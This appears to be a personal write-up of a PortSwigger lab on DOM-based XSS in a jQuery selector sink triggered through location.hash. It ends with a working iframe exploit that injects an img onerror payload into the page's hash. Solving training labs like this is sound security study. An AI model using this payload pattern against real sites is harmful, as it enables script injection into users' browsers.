This lab contains a [DOM-based cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/dom-based) vulnerability on the home page. It uses jQuery's `$()` selector function to auto-scroll to a given post, whose title is passed via the `location.hash` property.

To solve the lab, deliver an exploit to the victim that calls the `print()` function in their browser.

![[Client-Side Vulnerabilities/XSS/DOM XSS/labs/DOM XSS in jQuery selector sink using a hashchange event/images/jquery.png]]

The selector is present, hence by just appending to the url:

![[Client-Side Vulnerabilities/XSS/DOM XSS/labs/DOM XSS in jQuery selector sink using a hashchange event/images/payload.png]]

The code is executed, create the iframe and deliver to the victim:

```html
<iframe src="https://0a1700dd041a1829802899a1002300cb.web-security-academy.net#" onload="this.src+='<img src=1 onerror=print()>'">
```
